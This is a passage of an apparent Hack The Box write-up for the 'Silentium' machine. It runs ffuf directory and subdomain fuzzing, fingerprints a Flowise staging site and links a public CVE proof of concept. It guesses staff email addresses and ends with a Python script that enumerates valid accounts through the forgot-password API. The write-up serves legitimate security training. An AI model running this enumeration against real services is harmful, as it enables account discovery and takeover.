+</pre> </div> </div> <p><br> Run the ffuf to try and brute-force some directories.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41320"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41320')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41320')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41320')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41320')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41320">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -u http://silentium.htb/FUZZ -e .html,.txt,.bak -fw 1866
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://silentium.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
+ :: Extensions       : .html .txt .bak 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 1866
+________________________________________________
+
+assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 38ms]
+:: Progress: [5095328/5095328] :: Job [1/1] :: 351 req/sec :: Duration: [1:19:19] :: Errors: 0 ::
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41320" onclick="terminalOverlayClose('bash-bash-41320')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41320')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41320')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41320')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41320" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -u http://silentium.htb/FUZZ -e .html,.txt,.bak -fw 1866
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://silentium.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
+ :: Extensions       : .html .txt .bak 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 1866
+________________________________________________
+
+assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 38ms]
+:: Progress: [5095328/5095328] :: Job [1/1] :: 351 req/sec :: Duration: [1:19:19] :: Errors: 0 ::
+</pre> </div> </div> <p><br> Fuzz Faster U Fool for some sweet sub directories.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41261"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41261')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41261')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41261')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41261')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41261">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" -fw 6
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://silentium.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt
+ :: Header           : Host: FUZZ.silentium.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 6
+________________________________________________
+
+staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 33ms]
+:: Progress: [2171687/2171687] :: Job [1/1] :: 803 req/sec :: Duration: [0:20:42] :: Errors: 0 ::
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41261" onclick="terminalOverlayClose('bash-bash-41261')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41261')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41261')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41261')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41261" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" -fw 6
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://silentium.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt
+ :: Header           : Host: FUZZ.silentium.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 6
+________________________________________________
+
+staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 33ms]
+:: Progress: [2171687/2171687] :: Job [1/1] :: 803 req/sec :: Duration: [0:20:42] :: Errors: 0 ::
+</pre> </div> </div> <p><br> Update the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> with the newly found subdomain.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4437"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4437')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4437')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4437')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4437')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4437">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	pwnbox7.1
+10.129.245.103  silentium.htb staging.silentium.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+127.0.0.1 localhost
+127.0.1.1 htb-oldwz1kkne htb-oldwz1kkne.htb-cloud.com
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4437" onclick="terminalOverlayClose('bash-bash-4437')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4437')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4437')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4437')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4437" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	pwnbox7.1
+10.129.245.103  silentium.htb staging.silentium.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+127.0.0.1 localhost
+127.0.1.1 htb-oldwz1kkne htb-oldwz1kkne.htb-cloud.com
+</pre> </div> </div> <p><br> Give <code class="language-plaintext highlighter-rouge">curl -I</code> to pull the header to try and finger-print the tech.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4486"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4486')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4486')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4486')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4486')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4486">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ curl -I http://staging.silentium.htb
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Mon, 24 Aug 2026 13:04:19 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 3142
+Connection: keep-alive
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Accept-Ranges: bytes
+Cache-Control: public, max-age=0
+Last-Modified: Mon, 11 Aug 2025 12:14:01 GMT
+ETag: W/"c46-198990d4728"
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4486" onclick="terminalOverlayClose('bash-bash-4486')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4486')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4486')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4486')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4486" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ curl -I http://staging.silentium.htb
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Mon, 24 Aug 2026 13:04:19 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 3142
+Connection: keep-alive
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Accept-Ranges: bytes
+Cache-Control: public, max-age=0
+Last-Modified: Mon, 11 Aug 2025 12:14:01 GMT
+ETag: W/"c46-198990d4728"
+</pre> </div> </div> <p><br> Check out the staging landing page.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/staginglanding.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Staging Landing Page" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the source code and notice the Flowise title.</p> <div class="terminal" data-language="browser" id="terminal-view-source-http-staging-silentium-htb-browser-401483"> <div class="terminal__header terminal__header--browser"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('view-source-http-staging-silentium-htb-browser-401483')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('view-source-http-staging-silentium-htb-browser-401483')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('view-source-http-staging-silentium-htb-browser-401483')" title="Maximize"></button> </div> <span class="terminal__title">view-source:http://staging.silentium.htb</span> <button class="terminal__copy" onclick="terminalCopy('view-source-http-staging-silentium-htb-browser-401483')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-view-source-http-staging-silentium-htb-browser-401483">
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+    &lt;head&gt;
+        &lt;title&gt;Flowise - Build AI Agents, Visually&lt;/title&gt;
+        &lt;link rel="icon" href="favicon.ico" /&gt;
+        &lt;!-- Meta Tags--&gt;
+        &lt;meta charset="utf-8" /&gt;
+        &lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+        &lt;meta name="theme-color" content="#2296f3" /&gt;
+        &lt;meta name="title" content="Flowise - Build AI Agents, Visually" /&gt;
+        &lt;meta
+            name="description"
+            content="Open source generative AI development platform for building AI agents, LLM orchestration, and more"
+        /&gt;
+        &lt;link rel="manifest" href="manifest.json" /&gt;
+        &lt;link rel="apple-touch-icon" href="logo192.png" /&gt;
+        &lt;meta name="keywords" content="react, material-ui, workflow automation, llm, artificial-intelligence" /&gt;
+        &lt;meta name="author" content="FlowiseAI" /&gt;
+        &lt;!-- Open Graph / Facebook --&gt;
+        &lt;meta property="og:locale" content="en_US" /&gt;
+        &lt;meta property="og:type" content="website" /&gt;
+        &lt;meta property="og:url" content="https://flowiseai.com/" /&gt;
+        &lt;meta property="og:site_name" content="flowiseai.com" /&gt;
+        &lt;meta property="og:title" content="Flowise - Build AI Agents, Visually" /&gt;
+        &lt;meta
+            property="og:description"
+            content="Open source generative AI development platform for building AI agents, LLM orchestration, and more"
+        /&gt;
+        &lt;!-- Twitter --&gt;
+
+&lt;snip&gt;
+
+&lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</pre> </div> <div class="terminal__overlay" id="overlay-view-source-http-staging-silentium-htb-browser-401483" onclick="terminalOverlayClose('view-source-http-staging-silentium-htb-browser-401483')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header terminal__header--browser"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('view-source-http-staging-silentium-htb-browser-401483')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('view-source-http-staging-silentium-htb-browser-401483')" title="Restore"></button> </div> <span class="terminal__title">view-source:http://staging.silentium.htb</span> <button class="terminal__copy" onclick="terminalCopyModal('view-source-http-staging-silentium-htb-browser-401483')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-view-source-http-staging-silentium-htb-browser-401483" data-language="browser">
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+    &lt;head&gt;
+        &lt;title&gt;Flowise - Build AI Agents, Visually&lt;/title&gt;
+        &lt;link rel="icon" href="favicon.ico" /&gt;
+        &lt;!-- Meta Tags--&gt;
+        &lt;meta charset="utf-8" /&gt;
+        &lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+        &lt;meta name="theme-color" content="#2296f3" /&gt;
+        &lt;meta name="title" content="Flowise - Build AI Agents, Visually" /&gt;
+        &lt;meta
+            name="description"
+            content="Open source generative AI development platform for building AI agents, LLM orchestration, and more"
+        /&gt;
+        &lt;link rel="manifest" href="manifest.json" /&gt;
+        &lt;link rel="apple-touch-icon" href="logo192.png" /&gt;
+        &lt;meta name="keywords" content="react, material-ui, workflow automation, llm, artificial-intelligence" /&gt;
+        &lt;meta name="author" content="FlowiseAI" /&gt;
+        &lt;!-- Open Graph / Facebook --&gt;
+        &lt;meta property="og:locale" content="en_US" /&gt;
+        &lt;meta property="og:type" content="website" /&gt;
+        &lt;meta property="og:url" content="https://flowiseai.com/" /&gt;
+        &lt;meta property="og:site_name" content="flowiseai.com" /&gt;
+        &lt;meta property="og:title" content="Flowise - Build AI Agents, Visually" /&gt;
+        &lt;meta
+            property="og:description"
+            content="Open source generative AI development platform for building AI agents, LLM orchestration, and more"
+        /&gt;
+        &lt;!-- Twitter --&gt;
+
+&lt;snip&gt;
+
+&lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</pre> </div> </div> <p><br> Google the Flowise app to find an exploit that can be used.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/exploit.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Find Exploit" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC" rel="external nofollow noopener" target="_blank">https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC</a></p> <p><br> Check the landing page, again, and note the different name that are listed under Intuitional Leadership.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/leadership.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Institutional Leadership" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use those names to generate a list of potential emails using common variations of usernames and the website domain as the email domain.</p> <div class="codebox"> <div class="codebox__header"> <span class="codebox__title">usernames.txt</span> </div> <pre class="codebox__body">
+marcus.thorne@silentium.htb
+marcus@silentium.htb
+thorne@silentium.htb
+mthorne@silentium.htb
+m.thorne@silentium.htb
+marcust@silentium.htb
+marcus_thorne@silentium.htb
+marcus-thorne@silentium.htb
+elena.rossi@silentium.htb
+elena@silentium.htb
+rossi@silentium.htb
+erossi@silentium.htb
+e.rossi@silentium.htb
+elenar@silentium.htb
+rossie@silentium.htb
+elena_rossi@silentium.htb
+elena-rossi@silentium.htb
+ben@silentium.htb
+b@silentium.htb
+ben1@silentium.htb
+</pre> </div> <p><br> Test an email just to see the behavior of forgot password.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/forgot.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Forgot Password" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the request in Burp so we can get a sense of the request.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/burp.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Burp Suite" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Create a bruter that uses all the emails that we identified identified earlier against the forgot password endpoint to identify a proper email.</p> <div class="terminal" data-language="python" id="terminal-fuzzer-py-python-91108"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('fuzzer-py-python-91108')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('fuzzer-py-python-91108')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('fuzzer-py-python-91108')" title="Maximize"></button> </div> <span class="terminal__title">fuzzer.py</span> <button class="terminal__copy" onclick="terminalCopy('fuzzer-py-python-91108')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-fuzzer-py-python-91108">
+import requests
+
+emails = [
+    'marcus.thorne@silentium.htb',
+    'marcus@silentium.htb',
+    'thorne@silentium.htb',
+    'mthorne@silentium.htb',
+    'm.thorne@silentium.htb',
+    'marcust@silentium.htb',
+    'marcus_thorne@silentium.htb',
+    'marcus-thorne@silentium.htb',
+    'elena.rossi@silentium.htb',
+    'elena@silentium.htb',
+    'rossi@silentium.htb',
+    'erossi@silentium.htb',
+    'e.rossi@silentium.htb',
+    'elenar@silentium.htb',
+    'rossie@silentium.htb',
+    'elena_rossi@silentium.htb',
+    'elena-rossi@silentium.htb',
+    'ben@silentium.htb',
+    'b@silentium.htb',
+    'ben1@silentium.htb'
+]
+
+url = 'http://staging.silentium.htb/api/v1/account/forgot-password'
+headers = {
+    'x-request-from': 'internal',
+    'Accept': 'application/json, text/plain, */*',
+    'Content-Type': 'application/json'
+}
+
+for email in emails:
+    data = {"user":{"email":email}}
+
+    r = requests.post(url=url,headers=headers,json=data)
+    if 'User Not Found' not in r.text:
+        print('-----------------------------------')
+        print(email)
+        print('-----------------------------------')
+</pre> </div> <div class="terminal__overlay" id="overlay-fuzzer-py-python-91108" onclick="terminalOverlayClose('fuzzer-py-python-91108')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('fuzzer-py-python-91108')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('fuzzer-py-python-91108')" title="Restore"></button> </div> <span class="terminal__title">fuzzer.py</span> <button class="terminal__copy" onclick="terminalCopyModal('fuzzer-py-python-91108')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-fuzzer-py-python-91108" data-language="python">
+import requests
+
+emails = [
+    'marcus.thorne@silentium.htb',
+    'marcus@silentium.htb',
+    'thorne@silentium.htb',
+    'mthorne@silentium.htb',
+    'm.thorne@silentium.htb',
+    'marcust@silentium.htb',
+    'marcus_thorne@silentium.htb',
+    'marcus-thorne@silentium.htb',
+    'elena.rossi@silentium.htb',
+    'elena@silentium.htb',
+    'rossi@silentium.htb',
+    'erossi@silentium.htb',
+    'e.rossi@silentium.htb',
+    'elenar@silentium.htb',
+    'rossie@silentium.htb',
+    'elena_rossi@silentium.htb',
+    'elena-rossi@silentium.htb',
+    'ben@silentium.htb',
+    'b@silentium.htb',
+    'ben1@silentium.htb'
+]
+
+url = 'http://staging.silentium.htb/api/v1/account/forgot-password'
+headers = {
+    'x-request-from': 'internal',
+    'Accept': 'application/json, text/plain, */*',
+    'Content-Type': 'application/json'
+}
+
+for email in emails:
+    data = {"user":{"email":email}}
+
+    r = requests.post(url=url,headers=headers,json=data)
+    if 'User Not Found' not in r.text:
+        print('-----------------------------------')
+        print(email)
+        print('-----------------------------------')
